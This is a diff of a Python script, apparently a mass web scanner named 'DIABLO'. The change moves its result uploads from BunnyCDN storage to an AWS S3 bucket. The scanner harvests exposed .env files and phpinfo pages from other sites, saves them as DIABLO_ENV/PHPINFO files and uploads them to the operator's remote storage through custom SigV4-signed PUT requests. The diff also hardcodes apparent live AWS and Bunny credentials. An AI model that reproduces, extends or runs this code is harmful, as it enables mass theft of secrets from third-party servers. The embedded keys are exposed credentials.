@@ -56,8 +56,79 @@ LOG_PATH = None
 LOG_UPLOAD_INTERVAL = random.randint(500, 800)
 LOG_ACTIVE = False
 
-BUNNY_STORAGE_URL = "https://storage.bunnycdn.com/bunn1"
-BUNNY_API_KEY = "03809509-5d8c-4c1a-b8c0358fa5d7-2670-4bb8"
+# S3 CONFIG — bucket dedicato per i risultati DIABLO
+S3_BUCKET = "q-pass-public"
+S3_FOLDER = "diablo-results"
+S3_REGION = "eu-north-1"
+S3_ACCESS_KEY = "AKIA6FGTUF5CY6A4MIXK"
+S3_SECRET_KEY = "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"
+S3_HOST = f"s3.{S3_REGION}.amazonaws.com"
+
+import hashlib
+import hmac
+
+def _aws_sign(key, msg):
+    return hmac.new(key, msg.encode("utf-8"), hashlib.sha256).digest()
+
+def _aws_sigv4_headers(bucket, key, payload, content_type="application/octet-stream"):
+    """Genera gli header Authorization per AWS Signature V4 (PUT object su S3)."""
+    amz_date = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
+    date_stamp = amz_date[:8]
+    service = "s3"
+    algorithm = "AWS4-HMAC-SHA256"
+
+    # Task 1 — Canonical Request
+    canonical_uri = f"/{key}"
+    canonical_querystring = ""
+    payload_hash = hashlib.sha256(payload).hexdigest() if isinstance(payload, bytes) else hashlib.sha256(payload.encode()).hexdigest()
+
+    canonical_headers = (
+        f"host:{bucket}.{S3_HOST}\n"
+        f"x-amz-content-sha256:{payload_hash}\n"
+        f"x-amz-date:{amz_date}\n"
+    )
+    signed_headers = "host;x-amz-content-sha256;x-amz-date"
+
+    canonical_request = (
+        f"PUT\n"
+        f"{canonical_uri}\n"
+        f"{canonical_querystring}\n"
+        f"{canonical_headers}\n"
+        f"{signed_headers}\n"
+        f"{payload_hash}"
+    )
+
+    # Task 2 — String to Sign
+    credential_scope = f"{date_stamp}/{S3_REGION}/{service}/aws4_request"
+    string_to_sign = (
+        f"{algorithm}\n"
+        f"{amz_date}\n"
+        f"{credential_scope}\n"
+        f"{hashlib.sha256(canonical_request.encode('utf-8')).hexdigest()}"
+    )
+
+    # Task 3 — Signing Key
+    k_date = _aws_sign(("AWS4" + S3_SECRET_KEY).encode("utf-8"), date_stamp)
+    k_region = _aws_sign(k_date, S3_REGION)
+    k_service = _aws_sign(k_region, service)
+    k_signing = _aws_sign(k_service, "aws4_request")
+
+    # Task 4 — Signature
+    signature = hmac.new(k_signing, string_to_sign.encode("utf-8"), hashlib.sha256).hexdigest()
+
+    auth = (
+        f"{algorithm} Credential={S3_ACCESS_KEY}/{credential_scope}, "
+        f"SignedHeaders={signed_headers}, "
+        f"Signature={signature}"
+    )
+
+    return {
+        "Host": f"{bucket}.{S3_HOST}",
+        "x-amz-date": amz_date,
+        "x-amz-content-sha256": payload_hash,
+        "Authorization": auth,
+        "Content-Type": content_type,
+    }
 
 DNS_WORKERS_EC2 = 100
 DNS_TIMEOUT_EC2 = 3
@@ -70,54 +141,60 @@ _CONTAINER_NAME = os.environ.get('HOSTNAME', f'local_{int(time.time())}')
 _SLOT_HASH = int(hashlib.md5(_CONTAINER_NAME.encode()).hexdigest()[:12], 16)
 INSTANCE_ID = _SLOT_HASH % TOTAL_SLOTS
 
-def upload_file_to_bunny(local_path, remote_path, max_retries=3):
-    headers = {"AccessKey": BUNNY_API_KEY}
-    url = f"{BUNNY_STORAGE_URL}/{remote_path}"
+def upload_file_to_s3(local_path, remote_path, max_retries=3):
+    """Carica un file su S3 nella cartella dedicata diablo-results — via HTTP PUT + AWS SigV4 (no boto3)."""
+    s3_key = f"{S3_FOLDER}/{remote_path}"
     last_error = None
     for attempt in range(max_retries):
         try:
-            print(f"[BUNNY UPLOAD] Invio file {local_path} verso {remote_path} (tentativo {attempt+1}/{max_retries})...", flush=True)
+            print(f"[S3 UPLOAD] Invio file {local_path} verso s3://{S3_BUCKET}/{s3_key} (tentativo {attempt+1}/{max_retries})...", flush=True)
             with open(local_path, "rb") as f:
-                res = requests.put(url, headers=headers, data=f, timeout=30)
+                payload = f.read()
+
+            headers = _aws_sigv4_headers(S3_BUCKET, s3_key, payload)
+            url = f"https://{S3_BUCKET}.{S3_HOST}/{s3_key}"
+            res = requests.put(url, headers=headers, data=payload, timeout=30)
+
             if res.status_code in [200, 201]:
-                print(f"[BUNNY UPLOAD] ✔️ Caricato su Bunny: {remote_path}", flush=True)
+                print(f"[S3 UPLOAD] OK Caricato su S3: s3://{S3_BUCKET}/{s3_key}", flush=True)
                 return True
             elif res.status_code == 429:
                 wait = 2 ** attempt
-                print(f"[BUNNY UPLOAD] ⏳ Rate limited (429), retry tra {wait}s...", flush=True)
+                print(f"[S3 UPLOAD] Rate limited (429), retry tra {wait}s...", flush=True)
                 time.sleep(wait)
-                last_error = f"429 Rate Limited"
+                last_error = "429 Rate Limited"
             elif res.status_code >= 500:
                 wait = 2 ** attempt
-                print(f"[BUNNY UPLOAD] ⏳ Server error {res.status_code}, retry tra {wait}s...", flush=True)
+                print(f"[S3 UPLOAD] Server error {res.status_code}, retry tra {wait}s...", flush=True)
                 time.sleep(wait)
-                last_error = f"Status {res.status_code} - {res.text}"
+                last_error = f"Status {res.status_code} - {res.text[:200]}"
             else:
-                print(f"[BUNNY UPLOAD] ❌ Errore upload {remote_path}: Status {res.status_code} - {res.text}", flush=True)
+                print(f"[S3 UPLOAD] Errore upload {s3_key}: Status {res.status_code} - {res.text[:200]}", flush=True)
+                last_error = f"Status {res.status_code} - {res.text[:200]}"
                 return False
         except Exception as e:
             last_error = str(e)
             if attempt < max_retries - 1:
                 wait = 2 ** attempt
-                print(f"[BUNNY UPLOAD] ⚠️ Eccezione upload {remote_path}: {e}, retry tra {wait}s...", flush=True)
+                print(f"[S3 UPLOAD] Eccezione upload {s3_key}: {e}, retry tra {wait}s...", flush=True)
                 time.sleep(wait)
             else:
-                print(f"[BUNNY UPLOAD] ❌ Upload FALLITO definitivamente {remote_path}: {e}", flush=True)
+                print(f"[S3 UPLOAD] Upload FALLITO definitivamente {s3_key}: {e}", flush=True)
     if last_error:
         try:
             with open(os.path.join('risultati', 'ERROR2.txt'), 'a', encoding='utf-8') as f:
-                f.write(f"Error uploading to Bunny Storage ({remote_path}): {last_error}\n")
+                f.write(f"Error uploading to S3 ({s3_key}): {last_error}\n")
         except:
             pass
     return False
 
-def upload_log_to_bunny():
+def upload_log_to_s3():
     if not LOG_ACTIVE:
         return
     if not LOG_PATH or not os.path.exists(LOG_PATH):
         return
     remote = f"logs/{os.path.basename(LOG_PATH)}"
-    upload_file_to_bunny(LOG_PATH, remote, max_retries=1)
+    upload_file_to_s3(LOG_PATH, remote, max_retries=1)
 
 def load_config():
     try:
@@ -351,7 +428,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                         remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_ENV_NEW_{rnd_suffix}.txt"
 
                         if saved_file_path and remote_subpath:
-                            upload_file_to_bunny(saved_file_path, remote_subpath)
+                            upload_file_to_s3(saved_file_path, remote_subpath)
 
                     try: r.close()
                     except: pass
@@ -470,7 +547,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                                                 remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_PHPINFO_{rnd_suffix}.txt"
 
                                                 if saved_file_path and remote_subpath:
-                                                    upload_file_to_bunny(saved_file_path, remote_subpath)
+                                                    upload_file_to_s3(saved_file_path, remote_subpath)
 
 
                                 except: pass
@@ -699,7 +776,7 @@ def main():
         while True:
             time.sleep(LOG_UPLOAD_INTERVAL)
             try:
-                upload_log_to_bunny()
+                upload_log_to_s3()
             except Exception:
                 pass
 
